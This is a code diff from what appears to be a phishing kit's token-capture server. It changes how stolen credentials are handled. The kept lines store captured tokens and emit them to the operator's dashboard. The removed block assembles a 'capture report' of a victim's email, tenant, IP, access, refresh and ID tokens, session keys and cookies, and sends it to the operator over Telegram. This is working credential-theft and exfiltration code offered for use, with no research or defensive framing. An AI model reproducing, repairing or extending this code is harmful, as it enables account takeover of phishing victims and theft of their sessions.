@@ -644,131 +644,13 @@ async function storeToken(job, tokenData, responseCookies = []) {
         io.to(`user_${job.user_id}`).emit('new_token', {
           id: tokenId,
           email,
-          token_type: 'token',
+          token_type: auth_mode || 'token',
           created_at: new Date(),
         });
       }
     } catch (e) {
       /* silent */
     }
-
-    // Timestamp for notification
-    const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
-
-    const templateType = 'office';
-
-    // Build caption summary (HTML, <=1024 chars)
-    const AMP = String.fromCharCode(38) + 'amp;';
-    const LT = String.fromCharCode(38) + 'lt;';
-    const GT = String.fromCharCode(38) + 'gt;';
-    const esc = (val) => {
-      if (val === null || val === undefined) return 'N/A';
-      const s = typeof val === 'string' ? val : JSON.stringify(val);
-      return s.replace(/&/g, AMP).replace(/</g, LT).replace(/>/g, GT);
-    };
-
-    const captionLines = [
-`🚨 <b>NEW CAPTURE - TOKEN</b>`,
-      `👤 <b>Email:</b> ${esc(email || 'unknown')}`,
-      `🏷️ <b>Account:</b> ${esc(accountType)} | <b>Tenant:</b> ${esc(tenant)}`,
-      `🌐 <b>Template:</b> ${esc(templateType)}`,
-      `🌍 <b>IP:</b> ${esc(ipAddress || '0.0.0.0')}`,
-      `🔗 <b>Link:</b> ${esc(job.link_id)}       | <b>Token ID:</b> ${esc(tokenId)}`,
-`📅 <b>Time:</b> ${esc(stamp)}`,
-      `✅ Full tokens in attached .txt`,
-    ];
-    const caption = captionLines.join('\n');
-
-    // Build full file content
-    const fileParts = [
-      'VGENIUS CAPTURE REPORT',
-      '========================================',
-      `Type:        TOKEN`,
-      `Token ID:    ${tokenId}`,
-      `Link ID:     ${job.link_id}`,
-      `Email:       ${email || 'unknown'}`,
-      `Account:     ${accountType}`,
-      `Tenant:      ${tenant}`,
-      `Template:    ${templateType}`,
-      `IP:          ${ipAddress || '0.0.0.0'}`,
-      `User-Agent:  ${userAgent || 'DeviceProxy'}`,
-      `Captured:    ${stamp}`,
-      '========================================',
-      '',
-      'ACCESS TOKEN:',
-      tokenData.access_token || 'N/A',
-      '',
-    ];
-
-    if (tokenData.refresh_token) {
-      fileParts.push('REFRESH TOKEN:');
-      fileParts.push(tokenData.refresh_token);
-      fileParts.push('');
-    }
-
-    if (tokenData.id_token) {
-      fileParts.push('ID TOKEN:');
-      fileParts.push(tokenData.id_token);
-      fileParts.push('');
-    }
-
-    // PRT persistence fields (captured from full token response)
-    if (tokenData.client_info) {
-      fileParts.push('CLIENT INFO:');
-      fileParts.push(tokenData.client_info);
-      fileParts.push('');
-    }
-
-    if (tokenData.session_key) {
-      fileParts.push('SESSION KEY:');
-      fileParts.push(tokenData.session_key);
-      fileParts.push('');
-    }
-
-    if (tokenData.session_key_enc) {
-      fileParts.push('SESSION KEY ENC:');
-      fileParts.push(tokenData.session_key_enc);
-      fileParts.push('');
-    }
-
-    if (tokenData.token_type) {
-      fileParts.push('TOKEN TYPE:');
-      fileParts.push(tokenData.token_type);
-      fileParts.push('');
-    }
-
-    if (tokenData.expires_in) {
-      fileParts.push('EXPIRES IN:');
-      fileParts.push(tokenData.expires_in);
-      fileParts.push('');
-    }
-
-    if (tokenData.foci) {
-      fileParts.push('FCOI:');
-      fileParts.push(tokenData.foci);
-      fileParts.push('');
-    }
-
-    if (tokenData.refresh_in_on_revocation) {
-      fileParts.push('REFRESH IN ON REVOCATION:');
-      fileParts.push(tokenData.refresh_in_on_revocation);
-      fileParts.push('');
-    }
-
-    if (responseCookies && responseCookies.length > 0) {
-      fileParts.push('========================================');
-      fileParts.push(`COOKIES (${responseCookies.length} cookies):`);
-      fileParts.push(responseCookies.map(c => `${c.name}=${c.value}; domain=${c.domain}`).join('; '));
-      fileParts.push('');
-    }
-
-    fileParts.push('========================================');
-    fileParts.push('END OF REPORT');
-    const fileContent = fileParts.join('\n');
-    const filename = `capture_device_${tokenId}_token.txt`;
-
-    // Send the full report as a Telegram document
-    await sendTelegramDocument(job.user_id, filename, fileContent, caption);
 
     console.log(`[DeviceProxy] Token captured for user ${job.user_id}, link ${job.link_id}`);
   } catch (err) {
